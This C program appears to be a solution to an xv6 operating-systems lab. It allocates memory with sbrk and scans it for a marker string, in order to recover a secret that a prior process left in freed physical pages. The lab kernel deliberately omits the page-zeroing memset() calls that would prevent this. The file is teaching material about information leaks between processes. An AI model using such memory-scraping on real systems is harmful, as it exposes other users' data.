#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// Steal the secret that an earlier run of secret.c left behind in
// physical memory.
//
// This lab is compiled with LAB_SYSCALL defined, which omits the three
// memset() calls in kfree(), kalloc() and uvmalloc().  A page that a
// process frees therefore keeps its old contents, and a later process
// that allocates memory can be handed that very page.
//
// secret.c does:
//     strcpy(data, "This may help.");   // marker at offset 0
//     strcpy(data + 16, argv[1]);       // the secret at offset 16
// so scan for the marker and print what follows it.
//
// The allocation has to be eager: sbrk() -> growproc() -> uvmalloc(),
// whose memset() is the one that was omitted.  sbrklazy() would get its
// pages from vmfault() instead, and vmfault() zeroes them
// unconditionally, so a lazy attack finds nothing but zeros.

#define MARKER "This may help."
#define MARKERLEN 14
#define SECRETMAX 32

// secret frees roughly a dozen pages (8 data pages plus page-table and
// trapframe pages) and kmem's freelist is LIFO, so those pages sit near
// the head.  Grabbing far more than that makes the attack reliable
// without needing a second run.
#define CHUNK (512 * PGSIZE)

// The marker occurs twice in the pages secret leaves behind:
//
//   1. in secret's .rodata, as the string literal that strcpy() reads
//      from.  Whatever literal the linker placed 16 bytes later follows
//      it -- in practice "(null)" from the linked-in printf.o.
//   2. in secret's .bss, as the copy strcpy() wrote into data[].  The
//      real secret sits 16 bytes into that one.
//
// Tell them apart using what the lab guarantees about the secret: it
// holds only digits and letters.  Reject anything else, and bound the
// scan so it cannot run past the region we own.
static int
is_secret(char *s)
{
  int n;

  for(n = 0; n < SECRETMAX; n++){
    char c = s[n];
    if(c == '\0')
      return n > 0;
    if(!((c >= '0' && c <= '9') ||
         (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z')))
      return 0;
  }
  return 0;   // no nul within SECRETMAX: not a secret
}

int
main(int argc, char *argv[])
{
  char *base;
  char *p;
  int found = 0;

  base = sbrk(CHUNK);
  if(base == SBRK_ERROR){
    printf("attack: sbrk failed\n");
    exit(1);
  }

  // The 96 bytes of slack guarantee that is_secret() cannot read past
  // the end of the region sbrk() gave us.
  for(p = base; p + 96 <= base + CHUNK; p++){
    // Cheap first-byte filter: only about one offset in 256 can match,
    // so this avoids a 14-byte memcmp almost everywhere.
    if(*p != 'T' || memcmp(p, MARKER, MARKERLEN) != 0)
      continue;
    if(is_secret(p + 16)){
      printf("%s\n", p + 16);
      found = 1;
    }
  }

  exit(found ? 0 : 1);
}
